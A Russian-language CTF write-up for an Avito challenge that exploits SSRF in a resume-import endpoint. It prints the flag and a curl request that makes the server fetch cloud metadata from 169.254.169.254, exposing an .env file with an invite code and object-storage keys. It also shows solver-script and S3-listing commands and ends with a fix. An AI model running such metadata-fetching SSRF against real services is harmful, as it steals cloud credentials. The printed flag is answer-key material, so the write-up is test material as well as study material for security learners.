# МёдХантер: приглашение

**Флаг:** `avito{ExcLu51V3_pDF_4cc3Ss_3NAblEd}`

Импорт резюме принимает произвольный URL и возвращает содержимое ответа.
Запрос к metadata service раскрывает cloud-init с конфигурацией приложения,
включая `PDF_BETA_INVITE_CODE` — флаг первой части МёдХантера.

## SSRF к metadata service

`POST /api/seeker/resume/import` не блокирует link-local адрес `169.254.169.254`.
На машине работает `yc-imdsv1-bridge`: AWS-совместимые пути доступны без специального
заголовка, что позволяет обратиться к ним через импорт резюме.

```bash
curl -s -b cookies.txt -X POST \
  https://hrportal-aoa51cvc.avitoctf.ru/api/seeker/resume/import \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/user-data"}'
```

В ответе находится `/opt/app/.env`. Код из `PDF_BETA_INVITE_CODE` принимается
обработчиком `POST /api/seeker/pdf/activate`. Там же раскрываются реквизиты Object
Storage, которые используются в следующих частях.

## Запуск

Нужны работающий портал и cookie соискателя. Скрипт принимает файл с заголовком
Cookie либо Netscape cookie jar от `curl`:

```bash
uv run python medhunter_invite/solve_medhunter_invite.py --cookie-file cookies.txt --activate
uv run python medhunter_invite/solve_medhunter_invite.py --self-test
```

`--activate` отправляет найденный код на портал; `--output` сохраняет ответ SSRF.
Самотест проверяет разбор cookie и ответа, не обращаясь к стенду.

Общий S3-клиент позволяет проверить полученные реквизиты:

```bash
STORAGE_ACCESS_KEY='...' STORAGE_SECRET_KEY='...' \
uv run python medhunter_signature/s3.py list medhunter-resumes-6d6c314a
```

## Файлы

[solve_medhunter_invite.py](solve_medhunter_invite.py) выполняет SSRF и извлекает код;
[s3.py](../medhunter_signature/s3.py) подписывает запросы Object Storage.
Ответы cloud-init и cookie не включены в Git.
Продолжение — [золотая звезда](../medhunter_vip/medhunter_vip_writeup.md) и
[секрет подписи](../medhunter_signature/medhunter_signature_writeup.md).

Нужно запретить импорту обращения к служебным адресам, включая редиректы, и не хранить
долгоживущие секреты в доступных приложению metadata.
